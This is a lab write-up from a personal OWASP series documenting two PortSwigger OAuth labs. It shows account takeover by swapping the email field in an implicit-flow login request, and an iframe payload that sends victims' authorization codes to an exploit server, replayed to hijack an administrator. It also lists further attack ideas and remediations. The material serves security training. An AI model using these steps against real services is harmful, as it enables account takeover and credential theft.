# OWASP Top 10 Labs Series - OAuth Misconfiguration: Two Labs, Two Ways to Own an Account

> **Series:** I'm working through all ten OWASP Top 10 vulnerability categories hands-on using Juice Shop and PortSwigger, and documenting each one. OAuth misconfiguration sits under A07:2021 (Identification and Authentication Failures). This entry covers two PortSwigger labs, each showing a different way the same technology breaks. Follow along for the full A01 through A10 series.

<img width="728" height="420" alt="owasp" src="https://github.com/user-attachments/assets/69a85420-6553-4d10-8e02-9382774cdd51" />

---

## The Bug - What Is OAuth Misconfiguration?

OAuth is an authorization framework. When it works correctly, a third-party identity provider (Google, GitHub, etc.) authenticates the user and hands the client application a token or code that proves who they are. The client application is supposed to validate that proof before trusting it.

OAuth misconfiguration happens when that validation step is skipped, incomplete, or bypassable. The provider did its job. The client didn't. And that gap is where account takeover lives.

Two common failure modes - both covered here:

**Implicit flow without identity validation** - the client accepts user-supplied identity fields at face value instead of verifying them against the token.

**Unvalidated redirect_uri** - the authorization server sends OAuth codes to wherever the request tells it to, including attacker-controlled servers.

Both result in full account takeover. Different root causes, same outcome.

---

## Lab 1 - Authentication Bypass via OAuth Implicit Flow

**Platform:** PortSwigger Web Security Academy

### Identifying the OAuth Flow

Navigated to the app's login page. Instead of a username/password form, it redirected to a social login flow.


**[SS1 - PortSwigger lab page: "Authentication bypass via OAuth implicit flow", URL shows /social-login, "We are now redirecting you to login with social media..." - Lab Not solved]**
<img width="1915" height="427" alt="Screenshot 2026-07-07 112600" src="https://github.com/user-attachments/assets/c95da93a-8f65-4027-a5aa-4f67fecc24c5" />


The app was handing authentication entirely to an external OAuth provider. My question at this point: does the client verify what comes back, or does it just trust it?

### Capturing the Authentication Request

Performed a normal login with the test credentials, let Burp capture all traffic, then looked through the HTTP history for the request that actually logs the user in after OAuth completes.

**[SS2 - Burp HTTP History: POST /authenticate highlighted, request body shows email "wiener@hotdog.com", username "wiener", token value. Response is 302 redirect. Other OAuth flow requests visible above.]**
<img width="1412" height="695" alt="Screenshot 2026-07-07 113423" src="https://github.com/user-attachments/assets/7b2a1047-c327-4a27-9a65-0988cfc6cd3e" />



There it was. `POST /authenticate` with a JSON body containing three fields:

```json
{
  "email": "wiener@hotdog.com",
  "username": "wiener",
  "token": "h0aFQja4bQuZgRigog74eK5gQD67e7w4CHT14pvWvMo"
}
```

The token came from the OAuth provider. The email and username came from... the client. Sent in the request body. User-controlled.

The question was obvious: what happens if I change the email while keeping the token?

### Swapping the Email - The Actual Bypass

Sent the request to Burp Repeater. Changed the email field to `carlos@carlos-montoya.net` and left the token completely untouched.

**[SS3 - Burp Repeater: POST /authenticate with email changed to "carlos@carlos-montoya.net", username still "wiener", same token. Response is 302 Found with a new session cookie.]**
<img width="1427" height="792" alt="Screenshot 2026-07-07 113645" src="https://github.com/user-attachments/assets/8a6ce3bb-5856-49b8-8fb2-87568b935ea6" />


Response: `302 Found`. New session cookie issued. The app accepted it.

The server never validated whether the OAuth token belonged to the email address supplied. It just read the email field, looked up the account, and created a session. The token was essentially decorative.

### Result

Opened the response in the browser. Logged in as carlos.

**[SS4 - PortSwigger lab page: "Authentication bypass via OAuth implicit flow", LAB Solved banner, My Account page showing "Your username is: carlos", "Your email is: carlos@carlos-montoya.net"]**
<img width="1913" height="686" alt="Screenshot 2026-07-07 114318" src="https://github.com/user-attachments/assets/c95db374-b1c6-42c6-aba1-65c9b0d844bd" />



Full account takeover with someone else's email and my own token. No brute force. No password needed. One field swap.

---

## Lab 2 - OAuth Account Hijacking via redirect_uri

**Platform:** PortSwigger Web Security Academy

### Capturing the Authorization Request

Started the OAuth flow again, this time watching for the initial authorization request - the request that kicks off the OAuth dance with the provider.

**[SS5 - Burp HTTP History: GET /auth?client_id=... highlighted with 302 response, request shows redirect_uri pointing to the legitimate callback URL, response Location header shows authorization code in the redirect URL]**
<img width="1901" height="787" alt="Screenshot 2026-07-07 122856" src="https://github.com/user-attachments/assets/46648e7c-752d-4eea-b3b0-d28e8ae92292" />



The request contained:

```
GET /auth?client_id=a9upit3ujl4prdabt2xce
  &redirect_uri=https://client-app/oauth-callback
  &response_type=code
  &scope=openid%20profile%20email
```

The `redirect_uri` tells the OAuth provider where to send the authorization code after the user authenticates. If the server validates this strictly, it should only accept the registered callback URL. If it doesn't - it'll redirect to anywhere you tell it.

### Testing redirect_uri Validation

Sent the authorization request to Burp Repeater. Replaced the `redirect_uri` with the exploit server URL.

```
redirect_uri=https://exploit-0a2800a2037011488450cca3011700fe.exploit-server.net/exploit
```

**[SS6 - Burp Repeater: GET /auth with redirect_uri replaced by exploit server URL. Response is 302 Found, Location header shows the exploit server URL with ?code=YiHvhQPVYf6r4vaJup6ja7QHZnF05D6cVKY6MD_NE41 appended]**
<img width="1422" height="822" alt="Screenshot 2026-07-07 123242" src="https://github.com/user-attachments/assets/183e09fb-2f09-4782-b7f6-d4df981c727c" />



`302 Found`. Location header pointed to the exploit server with the authorization code appended as a query parameter. The OAuth provider accepted the attacker-controlled redirect URI without complaint.

The authorization code for the currently authenticated session just got sent to a server I control.

### Building the Exploit

Created a page on the exploit server with a single iframe. The iframe silently triggers the OAuth authorization request with the malicious redirect_uri whenever a victim loads the page.

**[SS7 - Exploit server showing iframe payload in the body field, src pointing to the OAuth authorization endpoint with redirect_uri set to the exploit server /exploit path, "Deliver exploit to victim" button visible]**
<img width="1877" height="907" alt="Screenshot 2026-07-07 124547" src="https://github.com/user-attachments/assets/bb50c1ba-af7a-4d62-a987-2e5bd8368f68" />



```html
<iframe src="https://oauth-server.net/auth?client_id=a9upit3ujl4prdabt2xce
  &redirect_uri=https://exploit-server.net/exploit
  &response_type=code
  &scope=openid%20profile%20email">
</iframe>
```

When the victim loads this page, their browser fires the OAuth request. Since they're already logged in, no login prompt appears. The provider just issues a code and redirects to wherever `redirect_uri` says - which is the exploit server.

### Authorization Code Stolen

Delivered the exploit to the victim and checked the access log.

**[SS8 - Exploit server access log: multiple GET /exploit?code=... requests from 10.0.3.17 (Victim user-agent), codes visible as query parameters in each log line]**
<img width="1912" height="952" alt="Screenshot 2026-07-07 124819" src="https://github.com/user-attachments/assets/eb47632e-a386-4565-ae4c-a8050ad26e30" />



The log was full of requests from the victim's browser, each one carrying a fresh authorization code as a query parameter. Every time the iframe fired, a new code landed in the log.

Copied the last code from the log.

### Account Hijacked

Manually hit the OAuth callback endpoint on the client application with the stolen code:

```
/oauth-callback?code=YiHvhQPVYf6r4vaJup6ja7QHZnF05D6cVKY6MD_NE41
```

The application exchanged it with the OAuth provider, got a valid token back for the victim's account, and issued a session. Logged in as the administrator.

**[SS9 - PortSwigger lab page: "OAuth account hijacking via redirect_uri", LAB Solved banner, /admin page showing "User deleted successfully!", Admin panel link visible in nav]**
<img width="1918" height="618" alt="Screenshot 2026-07-07 125707" src="https://github.com/user-attachments/assets/92d913bb-1a42-4e5d-a227-b61ccfa4d738" />


Deleted the target user from the admin panel. Lab solved.

---

## The Full Attack Chains

**Lab 1:** Log in normally → capture `POST /authenticate` in Burp → identify email as user-controlled field → send to Repeater → swap email to target user → keep token unchanged → send → 302 with victim's session → account owned.

**Lab 2:** Initiate OAuth flow → capture authorization request → identify unvalidated `redirect_uri` → send to Repeater → replace redirect URI with exploit server → confirm 302 redirects to attacker server with code → build iframe exploit → deliver to victim → codes arrive in access log → replay code at callback endpoint → administrator session → lab solved.

---

## What I Didn't Test But Exists

**PKCE Bypass**

PKCE (Proof Key for Code Exchange) is the current defense for authorization code flows. Without it, a stolen code is immediately usable. Some implementations have PKCE enabled but don't actually enforce the `code_verifier` on the server side - meaning an attacker can skip it entirely and the server never checks. Worth testing by sending a valid code without the verifier and seeing if the exchange still works.

**State Parameter Absence - CSRF on OAuth**

The `state` parameter is meant to be a CSRF token for the OAuth flow. If it's missing or not validated, an attacker can craft a login CSRF that silently links their OAuth account to a victim's existing account. Next time the victim logs in with their password, the attacker's OAuth identity is already attached. A quieter, more persistent form of account takeover.

**Open Redirect Chaining with redirect_uri**

Some OAuth servers won't accept a fully external redirect URI but will accept a path on the legitimate domain. If the client app has an open redirect anywhere - even in a completely unrelated feature - you can chain them. Point `redirect_uri` to the client's open redirect, which then forwards the code to your server. Strict domain allowlisting without path validation leaves this open.

**Token Leakage via Referer Header**

In implicit flows, the access token is appended to the URL as a fragment (`#access_token=...`). If the page loads any third-party resource after authentication - analytics, CDN assets, anything - the full URL including the token fragment can leak in the `Referer` header. No attacker infrastructure needed. Passive token theft.

**Scope Escalation**

OAuth scopes limit what a token can access. If the server doesn't validate the requested scope against what the client is actually authorized to request, an attacker can ask for `admin` or `write` scope in the authorization request and receive a token with elevated permissions. The client asks, the server grants it without checking whether it should.

---

## Real Breaches This Maps To

**Facebook, 2018** - A bug in the OAuth flow exposed access tokens for ~50 million accounts. The flaw was in the "View As" feature which incorrectly generated OAuth tokens. Attackers could use those tokens to take over accounts without passwords.

**GitHub, 2022** - OAuth tokens issued to Heroku and Travis CI were stolen and used to access private repositories including some belonging to npm. The tokens weren't stored by GitHub but were compromised at the OAuth client side - a reminder that the attack surface includes every app in the OAuth chain.

**Booking.com, 2017** - Researchers found a redirect_uri validation flaw that allowed authorization codes to be redirected to attacker-controlled URLs. Identical to Lab 2. A single parameter swap would have exposed any user's account.

---

## Remediation

| Issue | Fix |
|---|---|
| User-controlled identity fields trusted at login | Server must validate identity claims directly against the OAuth token, not against request body fields |
| Unvalidated redirect_uri | Enforce exact-match allowlist of registered redirect URIs on the authorization server; reject anything not on the list |
| Missing state parameter | Always generate and validate a `state` parameter to prevent CSRF on the OAuth flow |
| Implicit flow in use | Move to authorization code flow with PKCE; implicit flow is deprecated in OAuth 2.1 |
| No PKCE enforcement | Require and validate `code_verifier` on every token exchange |
| Broad scope acceptance | Validate requested scopes against the client's registered allowed scopes before issuing tokens |

---

## Three Takeaways

OAuth delegates authentication but not responsibility. The identity provider does its job correctly in both labs. The failures were entirely on the client side - one trusted user-supplied fields, one accepted arbitrary redirect URIs. The protocol isn't broken. The implementation was.

A single user-controlled field in a login request is enough. Lab 1 didn't need any clever crypto attack. Just swapping one email field while keeping a valid token bypassed authentication entirely. Servers need to verify the relationship between the token and the identity being claimed, not just that a token exists.

redirect_uri is the most dangerous parameter in OAuth. It controls where authorization codes go. An unvalidated redirect_uri turns any authenticated user's session into a code delivery service for an attacker. Exact-match allowlisting on the authorization server is the only real fix - domain-level matching is not enough.

---

> **Lab:** PortSwigger Web Security Academy - OAuth Labs | **Tools:** Burp Suite Community, Browser DevTools | **Category:** OWASP A07:2021 - Identification and Authentication Failures (OAuth Misconfiguration)
>
> *Part of my OWASP Top 10 Labs Series - documenting all ten categories hands-on. More writeups coming.*
